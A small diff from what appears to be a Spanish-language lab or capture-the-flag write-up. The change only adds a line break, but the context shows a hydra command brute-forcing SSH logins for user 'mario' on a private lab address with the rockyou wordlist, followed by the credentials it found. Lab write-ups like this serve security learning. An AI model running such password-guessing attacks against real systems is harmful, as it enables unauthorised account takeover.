@@ -41,6 +41,7 @@ hydra  -l mario -P /home/kali/Downloads/rockyou.txt ssh://172.18.0.2
 <br>
 Credenciales encontradas:
 <br>
+<br>
 Usuario: mario
 <br>
 Contraseña: chocolate
